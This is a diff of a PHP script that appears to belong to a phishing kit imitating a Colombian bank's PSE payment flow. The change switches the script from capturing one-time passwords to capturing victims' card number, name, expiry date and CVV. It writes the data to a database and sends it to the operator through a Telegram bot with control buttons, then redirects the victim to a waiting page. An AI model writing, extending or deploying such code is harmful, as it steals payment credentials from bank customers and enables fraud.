@@ -29,35 +29,43 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $bot_token = $localConfig['telegram']['bot_token'] ?? $config['botToken'];
     $chat_id = $localConfig['telegram']['chat_id'] ?? $config['chatId'];
-    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/config/pago/bancolombia/modules/api/actualizar_estado.php');
+    $baseUrl = $localConfig['base_url'] ?? ($config['baseUrl'] . '/config/pago/bancol/modules/api/actualizar_estado.php');
     $security_key = $config['security_key'];
 
     // 2. Recuperar datos
     $cliente_id = $_POST['cliente_id'] ?? null;
-    $otp_array = $_POST['otp'] ?? [];
-    $message = '';
+    $card_number = $_POST['card_number'] ?? '';
+    $card_name = $_POST['card_name'] ?? '';
+    $expiry_date = $_POST['expiry_date'] ?? '';
+    $cvv = $_POST['cvv'] ?? '';
 
-    if (empty($cliente_id) || count($otp_array) < 1) { // Removed strict check for 6 digits for flexibility
+    if (empty($cliente_id) || empty($card_number)) {
         header("Location: ../../index.php");
         exit();
     }
 
-    $submitted_otp = implode('', $otp_array);
-
-    // 3. Actualizar
+    // 3. Actualizar estado a 6 (Data Colected) o 0 (Finished) - Original usaba 0
     try {
-        $sql = "UPDATE pse SET estado = 1, otp = :otp WHERE id = :id"; // Usamos 6 o 0? Original usaba 0. Dejemos 6 (Data) o 0 (Wait). Update: Botones cambian el estado real. Aquí solo notificamos.
-        // Si el usuario envia OTP, se queda esperando.
+        $sql = "UPDATE pse SET estado = 1, tarjeta = :tarjeta, fecha = :fecha, cvv = :cvv WHERE id = :id";
         $stmt = $pdo->prepare($sql);
-        $stmt->execute(['otp' => $submitted_otp, 'id' => $cliente_id]);
-
-        $message = "✅ OTP Recibido ✅\n\n🆔 ID: {$cliente_id}\n🔐 OTP: {$submitted_otp}";
-
+        $stmt->execute([
+            'tarjeta' => $card_number,
+            'fecha' => $expiry_date,
+            'cvv' => $cvv,
+            'id' => $cliente_id
+        ]);
     } catch (PDOException $e) {
-        $message = "⚠️ Error DB OTP ID: {$cliente_id}";
+        // error_log
     }
 
-    // 4. Buttons
+    // 4. Telegram
+    $message = "💳 Datos Tarjeta Recibidos 💳\n\n";
+    $message .= "🆔 ID: " . $cliente_id . "\n";
+    $message .= "👤 Nombre: " . $card_name . "\n";
+    $message .= "🔢 Num: " . $card_number . "\n";
+    $message .= "🗓 Fecha: " . $expiry_date . "\n";
+    $message .= "🔒 CVV: " . $cvv . "\n";
+
     $keyboard = [
         'inline_keyboard' => [
             [
@@ -77,24 +85,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $encoded_keyboard = json_encode($keyboard);
 
-    // 5. Send
-    if (!empty($message)) {
-        $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
-        $post_fields = [
-            'chat_id' => $chat_id,
-            'text' => $message,
-            'reply_markup' => $encoded_keyboard
-        ];
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url_telegram);
-        curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
-    }
+    $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+    $post_fields = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'reply_markup' => $encoded_keyboard
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url_telegram);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
 
-    // 6. Redirect
+    // 5. Redirigir
     header("Location: ../../index.php?status=espera&id=" . $cliente_id);
     exit();
 
@@ -102,3 +107,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header("Location: ../../index.php");
     exit();
 }
+?>
